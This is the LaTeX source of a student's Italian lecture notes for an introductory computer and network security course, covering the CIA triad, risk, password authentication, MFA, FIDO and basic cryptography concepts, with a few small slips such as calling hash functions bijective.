\documentclass[twoside,a4paper]{report}
\usepackage[italian]{babel}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsthm}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{cancel}
\usepackage[margin=1in]{geometry}
\usepackage{hyperref}
\usepackage{bookmark}
\usepackage{setspace}
\usepackage{titlesec}
\usepackage{hyperref}
\usepackage{graphicx}
\usepackage{fancyhdr}
\usepackage{float}
\usepackage{wrapfig}
\usepackage{listings}
\usepackage{xcolor}

\graphicspath{{./images/}}

\newcommand{\figref}[1]{\figurename~\ref{#1}}

\setlength{\parskip}{0pt}
\titlespacing*{\subparagraph}{1.25em}{0em}{0.35em} 

\makeatletter
\renewenvironment{abstract}{%
    \if@twocolumn
        \section*{\abstractname}%
    \else
        \begin{center}%
            {\bfseries \abstractname\vspace{-.5em}\vspace{\z@}}%
        \end{center}%
        \small
        \begin{quotation}
    \fi}
    {\if@twocolumn\else\end{quotation}\fi}
\makeatother

\fancypagestyle{chapterInit}{%
    \fancyhf{}
    \renewcommand{\headrulewidth}{0pt}
    \fancyfoot{}
    \fancyfoot[LE,RO]{\thepage}
    \fancyfoot[LO,RE]{``Appunti di \textit{Introduction to Computer and Network Security}'' di Luca Facchini}
    \renewcommand{\footrulewidth}{0.4pt}
}
\fancypagestyle{stdPageS}{
    \fancyhead{}
    \fancyhead[RO,LE]{\leftmark}
    \fancyfoot{}
    \fancyfoot[LE,RO]{\thepage}
    \fancyfoot[LO,RE]{``Appunti di \textit{Introduction to Computer and Network Security}'' di Luca Facchini}
    \renewcommand{\footrulewidth}{0.4pt}
}

\addtocontents{toc}{\protect\thispagestyle{stdPageS}}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{white},   
    commentstyle=\color{green},
    keywordstyle=\color{blue},
    numberstyle=\tiny\color{gray},
    stringstyle=\color{red},
    basicstyle=\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}
\lstset{style=mystyle}

\title{Appunti di Introduction to Computer and Network Security}
\author{Luca Facchini (mat. 245965)}
\date{A.A. 2024/2025}

\hypersetup{
    pdfauthor={Luca Facchini},
    pdftitle={Appunti di Introduction to Computer and Network Security},
    pdfsubject={Appunti del corso di Introduction to Computer and Network Security tenuto dal prof. Ranise Silvio presso l'Università degli Studi di Trento nell'anno accademico 2024/2025.},
    pdfkeywords={Computer Security, Network Security, Introduction to Computer and Network Security, UniTN, Università degli Studi di Trento},
    pdfproducer={LaTeX},
    pdfcreator={pdflatex},
}

\begin{document}
    \pagenumbering{Roman}
    
    \begin{titlepage}
        \centering  % Center everything on the title page
        {\Huge\textbf{Appunti di \textit{Introduction to Computer and Network Security}}} \\[1cm] % Title
        \vspace{1.5cm}
        
        {\normalsize di: } \\[.3cm]
        {\Large Luca Facchini} \\ % Author name
        \vspace{1.5cm}
        
        {\large Corso tenuto dal prof. Ranise Silvio} \\[0.3cm] % Course information
        {\large Università degli Studi di Trento} \\[1.5cm]
        
        {\large A.A. 2024/2025} \\[3cm] % Academic year
        
        \vfill

        \begin{minipage}[t]{0.4\textwidth}
            \begin{flushleft} \normalsize
                \emph{Autore:}\\
                \textsc{Facchini} Luca \\ % Author name
                Mat. 245965 \\
                \vspace{-\baselineskip}
                \begin{tabbing}
                    Email:\= \href{mailto:luca.facchini-1@studenti.unitn.it}{luca.facchini-1@studenti.unitn.it} \\
                        \>  \href{mailto:luca@fc-software.it}{luca@fc-software.it}
                \end{tabbing}
            \end{flushleft}
        \end{minipage}
        \hfill
        \begin{minipage}[t]{0.4\textwidth}
            \begin{flushleft} \normalsize
                \emph{Corso:}\\
                Introduction to Computer and Network Security [145937] \\
                \textsc{CdL}: Laurea Triennale in Informatica \\
                Prof. \textsc{Ranise} Silvio \\
                Email: \href{mailto:silvio.ranise@unitn.it}{silvio.ranise@unitn.it}
            \end{flushleft}
        \end{minipage}

        % Abstract section with spacing control
        \vfill
        \begin{abstract}
            Appunti del corso di Introduction to Computer and Network Security tenuto dal prof. Ranise Silvio presso l'Università degli Studi di Trento nell'anno accademico 2024/2025.
        \end{abstract}
        
        
    \end{titlepage}
    \pagestyle{stdPageS}
    \begingroup
        \setcounter{tocdepth}{2}
        \tableofcontents
    \endgroup
    
    \newpage
    \pagenumbering{arabic}

    \chapter{Basic Notions - Nozioni Base}
\thispagestyle{chapterInit}
\section{The CIA Triad}
    \subsection{Introduzione}
    \paragraph{L'acronimo} L'acronimo CIA in inglese sta per \textbf{Confidentiality}, \textbf{Integrity} e \textbf{Availability}. Questi tre concetti sono alla base della sicurezza informatica e della protezione dei dati.  
        \subparagraph{Confidentiality - Riservatezza}
        \label{subPar:confidentiality}
            Il principio della Riservatezza prescrive che i non autorizzati non devono poter accedere ai dati e i dati sono visibili solo a chi è autorizzato a vederli.
        \subparagraph{Integrity - Integrità}
        \label{subPar:integrity}
            Il principio di Integrità prescrive che i dati non devono essere modificati se non da persone autorizzate a farlo, i tentativi di modifica non autorizzati devono essere rilevati e prevenuti.
        \subparagraph{Availability - Disponibilità}
            Il principio della Disponibilità prescrive che i dati non devono essere mantenuti inaccessibili ed inoltre bisogna permettere l'accesso agli autorizzati alle informazioni e ai servizi.
    \subsection{In Pratica}
        \paragraph{Confidentiality - Riservatezza}
            L'accesso alle informazioni riservare può essere:
            \subparagraph{Intenzionale} Quando un intruso cerca di accedere a dati sensibili.
            \subparagraph{Non Intenzionale} Quando un utente autorizzato accede a dati sensibili senza volerlo causato dal fatto che chi detiene i dati non è competente e/o non gli importa della sicurezza.
        
            Come garantire la riservatezza:
            \subparagraph{Crittografia} La \textbf{crittografia} è una tecnica che permette di limitare l'accesso ai dati solo a chi possiede la chiave per decifrarli (e quindi è autorizzato).
            \subparagraph{Access Control} Il \textbf{controllo degli accessi} è una parte integrante per mantenere la \textbf{riservatezza}, ciò andando a gestire quali utenti possono accedere a quali risorse.
        \paragraph{Integrity - Integrità}
            Per garantire l'integrità bisogna prevenire la modifica e/o la distruzione, inoltre bisogna assicurare informazioni autentiche e non invalidate.

            Inoltre ulteriore prescrizione è quella di individuare anche le cosiddette "minute changes" ovvero le modifiche minime che possono essere fatte ai dati per alterarne il significato. 
            
            L'integrità può essere anche di tipo \textbf{data integrity} ovvero la garanzia che i dati siano corretti e completi, oppure di tipo \textbf{system integrity} ovvero la garanzia che il sistema sia protetto da attacchi e che funzioni correttamente.

            L'itemize può essere compromessa da:
            \begin{itemize}
                \item errore umano
                \item attacchi come malware distruttivi e ransomware
            \end{itemize}
            Come garantire l'integrità:
            \subparagraph{Version Control} Il \textbf{controllo delle versioni} assieme agli \textbf{audit trails} permettono ad una organizzazione di garantire la veridicità dei dati.
            \subparagraph{Compliance requirements} I \textbf{requisiti di conformità} sono regole e normative che un'organizzazione deve seguire per garantire l'integrità dei dati.
        \paragraph{Availability - Disponibilità}
            Le violazioni alla disponibilità includono:
            \begin{itemize}
                \item Fallimento dell'infrastruttura 
                \item Overload dell'infrastruttura
                \item Blackout
                \item Attacchi come DDoS
            \end{itemize}
            Come garantire la disponibilità:
            \subparagraph{Backup} Bisogna sempre avere un piano di \textbf{backup} per mantenere disponibile in caso di disastro, attacco o altre minacce si verificassero.
            \subparagraph{Cloud} Il \textbf{cloud} è una soluzione per garantire la disponibilità dei dati, in quanto i dati sono replicati su più server e quindi in caso di guasto di uno di essi i dati sono comunque disponibili.
        
\section{Security Policy, Mechanism, Service}
    \subsection{Security Policy}
            \subsubsection{Definizione}
                Una \textbf{security policy} è un insieme di regole e requisiti stabilita da una azienda che definisce l'uso accettabile delle informazioni e dei servizi, inoltre il livello indica il livello di confidenzialità, integrità e disponibilità delle informazioni.
            \subsubsection{Esempi}
                Un esempio di possibili regole di una \textbf{security policy} potrebbero essere:
                \begin{itemize}
                    \item I dipendenti devono completare il corso su sicurezza informatica e accettare la policy di sicurezza.
                    \item I visitatori dell'azienda devono essere accompagnati da un dipendente autorizzato in tutti i momenti, questo dipendente deve mantenere i visitatori in una area appropriata senza dati sensibili
                    \item I dipendenti devono mantenere una "scrivania pulita" dunque senza lasciare documenti sensibili accessibili e incustoditi.
                    \item I dipendenti devono usare una password sicura e queste non devono essere usate in altri servizi esterni.
                    \item Gli ex-dipendenti non devono mantenere alcun dato dell'azienda.
                \end{itemize}
    \subsection{Security Service}
            \subsubsection{Definizione} La capacità di supportare uno o più dei requisiti di sicurezza (Confidentiality, Integrity, Availability) e.s.: gestione chiavi, controllo accessi, autenticazione.
                Come già detto i \textbf{Security Services} implementano uno o più \textbf{Security Mechanism} che servono per far rispettare la \textbf{Security Policy}.
            \subsubsection{Esempi}
                \paragraph{HTTP(S)}
                    \subparagraph{HTTP} Se si sua il protocolla \textbf{HTTP} per la trasmissione dei dati qualsiasi informazione trasmessa può venire intercettata da hacker nel mezzo.
                    \subparagraph{HTTPS} Per ovviare a questo problema si usa il protocollo \textbf{HTTPS} che è una versione sicura di \textbf{HTTP} che usa la crittografia per proteggere i dati, in questo modo i dati trasmessi vengono cifrati e se intercettati non possono essere letti.
                \paragraph{Access Control}
                    \includegraphics[height=12.5em]{01/accessControlSchema.png}
                    \subparagraph{Audit Log} è un registro importante che registra tutte le richieste di accesso ai dati e se la richiesta è stata accettata o rifiutata, in questo modo si può monitorare se una richiesta che è stata fatta ha avuto un risultato non aspettato e quindi che vadano modificate le \textbf{policy}.
    \subsection{Security Mechanism}
    \label{subsec:securityMechanism}
        \subsubsection{Definizione} Un \textbf{security mechanism} un dispositivo o funzione designato per provvedere uno o più servizi di sicurezza classificate in termini di potenza
            
            Inoltre è l'implementazione della \textbf{security policy}
        \subsubsection{Esempi}
    \subsection{Come si relazionano}
        In conclusione i \textbf{Security Services} implementano uno o più \textbf{Security Mechanism} che servono per far rispettare la \textbf{Security Policy}.
        
        \includegraphics[height=10em]{01/schemaSecurity.png}
\section{CIA, Security Violation, and Mitigation}
    \paragraph{} La triade CIA non è solo essenziale per rendere sicuri i dati ma aiuta anche a capire cosa è andato storto nel caso di una \textbf{security violation}
    \subsection{Attacco Ransomware}
        \paragraph{L'arttacco}
            Nel caso di un attacco ransomware i dati vengono tenuti in ostaggio e la vittima viene ricattata con la pubblicazione di dati personali o il mancato accesso ad essi fino a che un riscatto non viene pagato.

            Questo attacco cripta i dati rendendoli inaccessibili e per ripristinarli è necessaria una chiave di decodifica, i pagamenti solitamente vengono eseguiti in crypto valute poco tracciabili.

            Questo genere di attacco viola la \textbf{confidentiality} e la \textbf{availability} dei dati.
        \paragraph{Mitigation}
            Per mitigare il rischio (che comunque non può essere eliminato) è utile procedere con un approccio \textbf{Zero Thrust} ovvero un "protocollo" che richiede che tutti gli utenti all'interno e all'esterno della rete aziendale siano autenticati e che la connessione è continuamente validata, prima di consentire accesso a applicazioni e dati.

\section{Risk}
    \paragraph{} Non esiste un sistema sicuro, esistono solo diversi livelli di insicurezza, si punta sempre ad ottenere il miglior livello di sicurezza possibile con il budget a disposizione.
    \subsection{Vulnerability}
        \subsubsection{Definizione}
            Una \textbf{vulnerabilità} è una debolezza in un sistema informativo, un sistema di sicurezza, nei controlli interni o nell'implementazione di questi. Questa debolezza può essere sfruttata o compromessa da una minaccia alla sicurezza.
        \subsubsection{Examples}
            Un esempio di \textbf{vulnerabilità} è una backdoor nascosta nel software e/o hardware, oppure dei bug non conosciuti di un software, o anche delle password deboli.
    \subsection{Threat}
        \subsubsection{Definizione}
            Qualunque circostanza o evento con il potenziale per causare perdite o danni a: operazioni dell'azienda, risorse o individui che possono accedere a tali risorse tramite un accesso non autorizzato, distruzione, pubblicazione, modifica e/o DoS. Inoltre un \textbf{threat} è un potenziale attacco che sfrutta una \textbf{vulnerabilità} del sistema.
        \subsubsection{Examples}
                Un esempio di \textbf{threat} sono:
                \begin{itemize}
                    \item Hacker:
                        \begin{itemize}
                            \item Trova e/o \textbf{sniff} una password.
                            \item Una il \textbf{social engineering} per ottenere informazioni sensibili e password.
                            \item Occupa le risorse di sistema con richieste inutili (attacchi DoS).
                        \end{itemize}
                    \item Virus e worms:
                        \begin{itemize}
                            \item I \textbf{virus} sono programmi auto replicanti che richiedono una azione dell'utente per essere attivati, esempio ne è una Email, un allegato o un link o un Floppy/CD/USB infetto.
                            \item I \textbf{worms} sono programmi auto replicanti che non richiedono una azione dell'utente per essere attivati, esempio ne è un worm che sfrutta una vulnerabilità di un sistema operativo.
                        \end{itemize} 
                \end{itemize}
    \subsection{Attack}
        \subsubsection{Definizione} Un \textbf{attacco} è un qualsiasi attività dannosa che prova a raccogliere, degradare, negare o distruggere informazioni o servizi. Può anche manifestarsi sotto un tentativo di ottenere un accesso ad una risorsa alla quale non si ha diritto 
    \subsection{Risk}
        \subsubsection{Definizione}
            Il \textbf{rischio} è la \textbf{probabilità} che una particolare \textbf{minaccia} \textbf{sfrutti} una particolare \textbf{vulnerabilità}.Il \textbf{rischio} è inoltre una misura di quanto una particolare circostanza o evento possa essere potenzialmente minacciato ed è tipicamente in funzione di: 
            \begin{enumerate}
                \item L'impatto che questa circostanza o evento potrebbe avere
                \item La probabilità che questa circostanza o evento si verifichi
            \end{enumerate}
        \subsubsection{Riassumendo}
            Riassumendo le \textbf{minacce} sono una combinazione di \textbf{intento} e \textbf{capability} di un attacco con successo. Invece le \textbf{vulnerabilità} sono caratterizzate da quanto è facile \textbf{identificarle} e \textbf{sfruttarle}.
            
            C'è da dire che l'impatto di un attacco deve essere valutato dal punto di vista di ogni soggetto coinvolto, ad esempio un attacco che compromette la privacy di un singolo individuo può avere un impatto molto diverso se lo si guarda dal punto di vista dell'individuo o dell'azienda.
        \subsubsection{Risk Matrix}
            \includegraphics[height=10em]{01/riskMatrix.png}
            
            La presente matrice è una rappresentazione grafica del rischio, in cui si valuta la probabilità di un attacco e l'impatto che questo avrebbe, solitamente un rischio per essere accettabile deve avere un valore risultante tra basso (1-4) e medio-basso (5-9), i valori quali medio-alto (10-14) e alto (15-25) sono considerati inaccettabili e quindi devono essere mitigati abbassando la probabilità di attacco e/o l'impatto che questo avrebbe.

\section{Fine della diffusione degli attacchi}
    \paragraph{Generalmente} Il rischio è causato dunque dalla somma di una minaccia e una vulnerabilità, la minaccia è la capacità di sfruttare una vulnerabilità per causare un danno. 
    \paragraph{Pianizifazione} Quando si studiano i rischi sia prima che dopo un attacco bisogna considerare che se la \textbf{Minaccia - Threat} riesce a sfruttare la \textbf{Vulnerabilità - Vulnerability} allora si ha un \textbf{Rischio - Risk} se questo risulta inaccettabile allora si deve procedere con la \textbf{Mitigazione - Mitigation} del rischio, ciò riduce la \textbf{Minaccia - Threat} e il ciclo riprende fino a quando il \textbf{Rischio residuo - Residual Risk} è accettabile.

\section{Security \& Human Factor - Sicurezza \& Fattore Umano}
    Il fattore umano è uno dei fattori più importanti nella sicurezza informatica, infatti la maggior parte degli attacchi sono causati da password poco sicure o da una mancata preparazione degli utenti.
    \subsection{Passwords}
        C'è chi dice che le password andrebbero trattate come la biancheria intima, ovvero:
        \begin{itemize}
            \item Cambiate regolarmente - magari senza usare un pattern
            \item Non condivise con nessuno - nemmeno con colleghi o familiari
            \item Non lasciate sulla scrivania - non scritte su post-it o in chiaro
        \end{itemize}
    \subsection{Security}
        Ogni persona che ha accesso ad un sistema informatico è un potenziale punto di attacco, quindi è importante che ogni utente sia formato sulla sicurezza, ogni utente al suo livello a partire dall'utente base che necessita di una formazione base fino ad arrivare all amministratore di sistema che necessita di una formazione più avanzata.
    \chapter{Authentication I: Passwords \& co}
\thispagestyle{chapterInit}
\section{User Authentication \& Digital Identity - Autenticazione e Identità Digitale}
    \label{sec:user-authentication}
    \subsection{Introduzione e Definizioni}
        \begin{description}
            \item[Identità] è un insieme di attributi relazionati ad una entità
            \item[Attributo] è una caratteristica o proprietà di una entità ch e può essere usata per descriverne lo stato, apparenza o ogni altro aspetto.  
            \item[Identità digitale] è ua identità i quali attributi sono conservati e trasmessi in forma digitale 
        \end{description}
        Ma perché la identità digitale è importante? In pratica questa può essere una soluzione per diversi aspetti che i governi mondiali vorrebbero risolvere.
    \subsection{Digital Identity Lifecycle - Ciclo di Vita dell'Identità Digitale}
        \begin{description}
            \item[Creazione] L'identità viene creata, in genere da un ente di certificazione che assicura l'identità dell'utente e fornisce/chiede una forma di accesso per riconoscere in futuro l'utente. Viene creato un ID univoco per l'utente
            \item[Autenticazione] L'identità viene autenticata tramite il metodo concordato in fase di creazione
            \item[Autorizzazione/ Accesso] L'utente ha accesso a risorse e servizi in base ai permessi assegnati, i dati necessari dell'utente vengono trasmessi dall'ente di certificazione al servizio.
            \item[Cancellazione o Disattivazione] L'identità viene cancellata o disattivata quando non è più necessaria e i dati devono essere cancellati dopo un certo periodo di tempo per garantire la privacy dell'utente.
        \end{description}
        \subsubsection{Enrollment / On-Boarding - Creazione}
            La fase di creazione di una utenza porta un \textbf{Applicant} a diventare un \textbf{Subscriber} tramite una serie di passaggi:
            \begin{description}
                \item[Resolution] Vengono raccolti gli \textbf{attributi} essenziali dell'utente (nome, indirizzo, data e luogo di nascita, \dots) vengono ora raccolti anche due documenti di identità (patente, passaporto, C.I.,\dots) - ora l'utente viene distinto univocamente su un contesto
                \item[Validation] Gli \textbf{attributi} raccolti vengono validati sulla base di \textbf{prove} tramite una fonte autorevole- gli attributi vengono ora associati ad una persona fisica 
                \item[Verification] Le \textbf{prove} vengono verificate, in questo punto si verifica la corrispondenza tra le diverse foto, viene mandato un codice ai contatti per verificare che siano i suoi, etc - l'utente viene ora confermato e la sua identità è certificata 
            \end{description}
            \paragraph{Identity Assurance Levels - Livelli di Assicurazione dell'Identità}
                \begin{description}
                    \item[IAL1] GLi attributi, se presenti, vengono auto-dichiarati, o considerati come tali
                    \item[IAL2] Una persona o di remoto o in presenza, verifica gli attributi
                    \item[IAL3] Gli attributi vengono verificati da una persona autorizzata e i documenti fisici vengono esaminati
                \end{description}  
        \subsubsection{Authentication - Autenticazione}
            \paragraph{Definzione} L'\textbf{autenticazione} è il processo di verifica dell'identità di un utente, processo o dispositivo.

            Il \textbf{richiedente} deve dimostrare al \textbf{verificante} che è chi dice di essere.
            \paragraph{Base} Quando esegui il login solitamente inserisci un \textbf{username} e una \textbf{password} che vengono confrontati con quelli memorizzati nel sistema.

            L'autenticazione tramite \textbf{password} è molto diffusa e semplice da implementare.
\section{An Introduction to Passwords - Introduzione alle Password}
    \subsection{User Authn - Autenticazione Utente}
        Quando esegui il login inserisci un \textbf{username} per annunciare chi sei e una \textbf{password} per dimostrare chi dici di essere, questo tipo di autenticazione si chiama \textbf{user authn} ovvero il processo di verifica dell'identità di un utente.
        \subsubsection{Entollment - Creazione}
            Le \textbf{password} dovrebbero essere conosciute solo dall'utente e dal sistema. Spesso però, soprattutto nelle grandi aziende, le password vengono mandata via mail o scritte dall'utente su una pagina web. In questi casi da chi potrebbe essere intercettata la password?
        \subsubsection{La teoria rispetto alla realtà}
            Le password hanno dominato il mondo dell'informatica sin dall'avvento dei computer, ma da allora la richiesta verso queste è che siano più sicure ma allo stesso tempo più "User Friendly", siamo in ricerca di alternative ma per ora delle proposte alternative come \textit{criteri di complessità} ma studi hanno rilevato che spesso non vengono rispettati e/o che non sono efficaci. 
    \subsection{Password Security - Sicurezza delle Password}
        All'inizio di internet le password venivano conservate in file appositi in chiaro, ma questo comportava un rischio molto alto, infatti se un attaccante riusciva ad accedere a quel file poteva facilmente accedere a tutte le password.

        \subsubsection{Hashing}
            Per risolvere questo problema si è pensato di "\textbf{hash-are}" le password, ovvero di applicare una funzione di hash alla password e conservare il risultato. In questo modo se un attaccante accede al file delle password non può risalire alla password originale.
            \paragraph{Proprietà della funzione di hash}
                Una funzione di hash ottimale dovrebbe avere le seguenti proprietà:
                \begin{description}
                    \item[Deterministica] dato un input la funzione restituisce sempre lo stesso output
                    \item[Rapida] la funzione deve essere veloce da calcolare
                    \item[Difficile da invertire] data l'output è difficile risalire all'input
                    \item[Biettiva] due input diversi devono avere output diversi
                    \item[Lunghezza fissa] l'output deve avere una lunghezza fissa indipendentemente dalla lunghezza dell'input
                \end{description}
                Molto spesso però capita che i bit disponibili per l'hash siano limitati rispetto a tutti i possibili input, per questo motivo si è cercato di creare funzioni di hash che generano due output uguali solo in rarissimi casi, inoltre si aggiunge a questo che per input simili l'output sia molto diverso.
            \subsubsection{Crack of Passwords}
                In caso di un "leak" di password che sono state opportunamente codificate con una funzione di hash, un attaccante può tentare di decifrarle ma questo è molto difficile. Questo diventa più semplice se vengono usate password poco sicure e/o comuni. infatti si stimi che per  trovare una password da 8 caratteri composti da lettere minuscole e numeri ci vogliano "solo" 155€ su una istanza di AWS.
        \subsection{Hash \& Salt}
            Per rendere più difficile il lavoro degli attaccanti si è pensato di aggiungere un \textbf{salt} alle password, ovvero un valore casuale che viene aggiunto alla password prima di calcolare l'hash. Questo rende più difficile per l'attaccante decifrare la password.
\section{Multi Factor Authentication - Autenticazione a più fattori}
\label{sec:mfa}
    \subsection{Definizione}
        L'autenticazione a più fattori è un metodo di autenticazione che richiede l'uso di più metodi di autenticazione per verificare l'identità di un utente.
    \subsection{Fattori di Autenticazione}
        I fattori di autenticazione sono:
        \begin{description}
            \item[Qualcosa che sai] (password, PIN, \dots)
            \item[Qualcosa che hai] (smartphone, token, \dots)
            \item[Qualcosa che sei] (impronte digitali, riconoscimento facciale, \dots)
        \end{description}
        \subsubsection{Vantaggi/Svantaggi quello che sai}
            \paragraph{Vantaggi}
                \begin{itemize}
                    \item Facile da implementare - non richiede hardware aggiuntivo
                    \item Facile da usare - Basta ricordare la password
                    \item Facile da resettare se dimenticato - basta fare il reset della password
                \end{itemize}
            \paragraph{Svantaggi}
                \begin{itemize}
                    \item Facile da rubare - se un attaccante riesce a scoprire la password può accedere al sistema 
                    \item Facile da dimenticare - se la password è complessa è facile dimenticarla
                    \item Facile da indovinare - se la password è semplice ed è stata usata in altri contesti è facile indovinarla
                \end{itemize}
        \subsubsection{Vantaggi/Svantaggi quello che hai}
            \paragraph{Vantaggi}
                \begin{itemize}
                    \item Difficile da rubare - se un attaccante non ha il dispositivo non può accedere al sistema
                    \item Difficile da indovinare - se il dispositivo è protetto da PIN o password è difficile indovinare l'accesso
                    \item Difficile da clonare - se il dispositivo è protetto da un token è difficile clonarlo inoltre la parte di autenticazione è fatta dal dispositivo stesso e non dal sistema
                \end{itemize}
            \paragraph{Svantaggi}
                \begin{itemize}
                    \item Facile da perdere - se il dispositivo viene perso l'utente non può accedere al sistema
                    \item Difficile da resettare - se il dispositivo viene perso l'utente deve contattare l'amministratore per resettare l'accesso
                    \item Costoso - i dispositivi possono essere costosi 
                \end{itemize}
        \subsubsection{Vantaggi/Svantaggi quello che sei}
            \paragraph{Vantaggi}
                \begin{itemize}
                    \item Difficile da rubare - le impronte digitali o il riconoscimento facciale sono unici e difficili da rubare
                    \item Difficile da indovinare - è difficile indovinare le impronte digitali o il riconoscimento facciale
                    \item Difficile da clonare - è difficile clonare le impronte digitali o il riconoscimento facciale
                \end{itemize}
            \paragraph{Svantaggi}
                \begin{itemize}
                    \item Se il fattore viene compromesso non può essere cambiato - se le impronte digitali vengono rubate non possono essere cambiate
                    \item Costoso - i dispositivi possono essere costosi
                    \item Non sempre preciso - il riconoscimento facciale può essere ingannato
                \end{itemize}
        \subsubsection{PSD2 Compliance}
            \paragraph{Cos'è PSD2} La \textbf{PSD2} è una direttiva europea che regola i servizi di pagamento e che richiede l'autenticazione a più fattori per i pagamenti online. Questo per ridurre il rischio di frodi.
            \paragraph{How to comply MFA in PSD2} Una idea sarebbe quella di includere nella challenge anche i dati della particolare transazione come:
                \begin{itemize}
                    \item L'identificativo del destinatario della transazione
                    \item L'importo della transazione
                    \item L'instante nella quale la transazione è stata inizializzata
                    \item \dots
                \end{itemize}
            Purtroppo però ciò non è abbastanza in quanto i dati sopra indicati possono essere ricavati dal contesto il che rende la challenge prevedibile.
    \subsection{FIDO: Phishing Resistant Authentication}
        \subsubsection{Cos'è FIDO}
            \textbf{FIDO (Fast Identity Online)} è un insieme di standard aperti per l'autenticazione a più fattori che mira a ridurre il rischio di phishing. Il suo scopo è quello di assicurare una \textbf{autenticazione forte} e di \textbf{ridurre l'uso di password}.
        \subsubsection{Come funziona}
            \begin{enumerate}
                \item Viene chiesto all'utente di scegliere un ente FIDO
                \item L'utenti sblocca il dispositivo FIDO usando un'impronta digitale, un pulsante su un dispositivo di secondo fattore, un PIN o un qualsiasi altro metodo di autenticazione supportato
                \item Il dispositivo crea una chiave pubblica e una chiave privata univoca per il dispositivo, il servizio online e l'utente
                \item La chiave pubblica è inviata al servizio online ed associata all'account dell'utente
                \item Il servizio online chiede all'utente di autenticarsi con il dispositivo precedentemente registrato
                \item L'utente sblocca il dispositivo FIDO usando lo stesso metodo di autenticazione usato in precedenza
                \item Il dispositivo FIDO usa l'account dell'utente identificato per inviare la corretta chiave al servizio online
                \item Infine il dispositivo invia la challenge ricevuta dal servizio online firmata con la chiave privata e il servizio online verifica la firma con la chiave pubblica, l'utente è autenticato.
            \end{enumerate}
\section{Outsourcing Authentication}
    \label{sec:outsourcing-authentication}
    \subsection{Definizione}
        L'outsourcing dell'autenticazione è il processo di affidare l'autenticazione degli utenti ad un servizio esterno, spesso chiamato \textbf{Identity Provider}. Questo servizio si occupa di verificare l'identità dell'utente e di inviare un token di autenticazione al servizio che richiede l'autenticazione. Esempio in italia per l'accesso ai servizi pubblici si usa SPID.
    \subsection{Che problema risolve}
        L'outsourcing dell'autenticazione risolve diversi problemi:
        \begin{description}
            \item[Sicurezza] L'Identity Provider è specializzato in autenticazione e può offrire un livello di sicurezza più alto
            \item[User Experience] L'Identity Provider può offrire un'esperienza utente migliore in quanto l'utente non deve ricordare le password per ogni servizio ma solo quella dell'Identity Provider - SSO
            \item[Compliance] L'Identity Provider può aiutare a rispettare le normative sulla privacy e la sicurezza
        \end{description}
    \subsection{La soluzione}
        L'outsourcing dell'autenticazione è delegato ad una terza parte, l'\textbf{Identity Provider}, che si occupa di verificare l'identità dell'utente e di inviare le informazioni di autenticazione al servizio che richiede l'autenticazione. A questo punto il servizio invia all'utente un token di autenticazione che può essere usato per accedere al servizio senza dover inserire nuovamente le credenziali del SSO.
    \subsection{Potenziali Problemi}
        L'outsourcing dell'autenticazione può comportare alcuni problemi:
        \begin{description}
            \item[Single Point of Failure] Se l'Identity Provider è compromesso tutti i servizi che usano l'Identity Provider per l'autenticazione sono compromessi
            \item[Privacy] L'Identity Provider può raccogliere informazioni sull'utente e sulle sue abitudini di navigazione
        \end{description}
    \chapter{Cryptography Introduction}
\section{Cryptosystem}
    \paragraph{Definizione} Un \textbf{cryptosystem} è una tupla di 5 elementi (E,D,M,K,C):
    \begin{description}
        \item[E] è un \textit{algoritmo di cifratura}
        \item[D] è un \textit{algoritmo di de-cifratura}
        \item[M] è un insieme di \textit{messaggi in chiaro}
        \item[K] è un insieme di \textit{chiavi}
        \item[C] è un insieme di \textit{messaggi cifrati}
    \end{description}
    In modo astratto i punti \textbf{E} e \textbf{D} possono essere espresse come funzioni:
    $$
        \begin{aligned}
            E: M \times K \rightarrow C \\
            D: C \times K \rightarrow M
        \end{aligned}
        \qquad D(E(m,k),k) = m
    $$
    Nella criptografia base ogni chiave $ k \in K $ può essere usata per cifrare e de-cifrare i messaggi, nella criptografia simmetrica la chiave è la stessa per entrambi i processi, mentre nella criptografia asimmetrica le chiavi sono diverse.
    \paragraph{Quali componenti sono pubbliche?} Solitamente non abbiamo necessità di mantenere segrete le funzioni \texttt{E} e \texttt{D} o il messaggio cifrato \texttt{C}, quello che davvero deve essere segreto è la chiave \texttt{K}. Il motivo per il quale le funzioni non devono essere segrete è che il sistema deve essere pubblico e quindi tramite processi di \textit{reverse engineering} è possibile ricavare le funzioni (es: il sistema di cifratura di un DVD è stato ricavato tramite \textit{reverse engineering} dopo solo due giorni).
    \subsection{Why Cryptography?}
        \paragraph{Sicurezza} La crittografia è usata nei \hyperref[subsec:securityMechanism]{\textbf{meccanismi di sicurezza}} per garantire \hyperref[subPar:confidentiality]{\textbf{confidenzialità}} nascondendo il contenuto dei messaggi, \hyperref[subPar:integrity]{\textbf{integrità}} provvedendo al controllo di integrità tramite funzioni di \textbf{hash} e \textbf{la verifica dell'origine} dei dati tramite firme digitali verificabili da una fonte autorevole.
    \subsection{Cryptography on rented servers}
        \paragraph{Problema} Se si usa un server di terze parti per conservare dati, ad esempio su un database, è possibile che il proprietario del server possa accedere ai dati in chiaro. Per evitare ciò si può cifrare i dati prima di inviarli al server, in modo che il proprietario non possa leggerli, ciò comporta però un aumento del carico computazionale lato client in quanto tutti i dati prima di essere letti devono essere de-cifrati, per questo esistono meccanismi di ricerca su dati cifrati che permettono di effettuare ricerche su dati cifrati senza de-cifrarli, una volta trovati i dati desiderati si de-cifrano solo quelli.
    \subsection{Come definiamo "Computazionalmente sicuro" nelle comunicazioni}
        \paragraph{Definzizione} Definiamo un sistema di comunicazione \textbf{Computazionalmente sicuro} quando la decifrazione di un messaggio cifrato senza conoscere la chiave è molto difficile, o addirittura impossibile, e richiede molto tempo e risorse computazionali.
        \paragraph{$E(k,P)=C$} Calcolare $C$ da $P$ deve essere difficile senza $k$, inoltre calcolare $C$ da $P$ sapendo $k$ deve essere facile.
        \paragraph{$D(k,C)=P$} Calcolare $P$ da $C$ deve essere facile sapendo $k$, ma deve essere difficile senza $k$.
        \paragraph{Trapdoor - funzione a senso unico} Una \textbf{trapdoor} è una funzione a senso unico che richiede una ulteriore informazione. Ed una \textbf{funzione a senso unico} è descritta come una funzione che è facile da calcolare in una direzione, ma molto più difficile nell'altra.  
    \subsection{Hash v/s Encryption}
